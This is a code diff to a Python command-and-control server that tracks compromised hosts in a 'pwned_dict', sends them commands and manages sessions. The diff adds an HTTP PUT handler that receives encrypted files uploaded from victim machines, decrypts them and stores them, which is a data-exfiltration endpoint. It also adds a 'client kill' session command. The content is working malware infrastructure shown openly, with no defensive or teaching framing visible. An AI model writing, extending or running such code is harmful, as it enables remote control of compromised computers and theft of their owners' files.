@@ -6,7 +6,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
 from crypt import cipher
 from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT, KEEP_ALIVE_CMD,\
-    CWD_RESPONSE, FILE_REQUEST, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+    CWD_RESPONSE, FILE_REQUEST, FILE_SEND, STORAGE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 from inputimeout import inputimeout, TimeoutOccurred
 
 def get_new_session():
@@ -82,6 +82,9 @@ class C2Handler(BaseHTTPRequestHandler):
                 except BrokenPipeError as e:
                     print(f"Lost connection to {pwned_dict[active_session]}.\n")
                     get_new_session()
+                else:
+                    if cmd.startswith("client kill"):
+                        get_new_session()
                     
 
             # if client is in pwned_dict but is not our active session
@@ -108,6 +111,25 @@ class C2Handler(BaseHTTPRequestHandler):
             cwd = self.handle_post_data()
         else:
             print(f"{self.client_address[0]} just accessed {self.path} on our c2 server. Why ?\n")
+    
+    def do_PUT(self):
+        if self.path.startswith(FILE_SEND + "/"):
+            self.http_response(HTTPStatusCode.OK.value)
+            filename = self.path.split(FILE_SEND + "/")[1]
+
+            print(f"filename before decryption {filename}")
+            filename = cipher.decrypt(filename.encode()).encode()
+            incoming_file = STORAGE + "/" + filename
+            print(incoming_file)
+            file_length = int(self.headers["Content-Length"])
+            if file_length is None:
+                print(f"{incoming_file} has no data. Aborting transfer.")
+            else:
+                with open(incoming_file, 'wb') as file_handle:
+                    file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
+        else:
+            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP PUT. why ?\n")
+
                 
     def handle_post_data(self):
         self.http_response(HTTPStatusCode.OK.value)
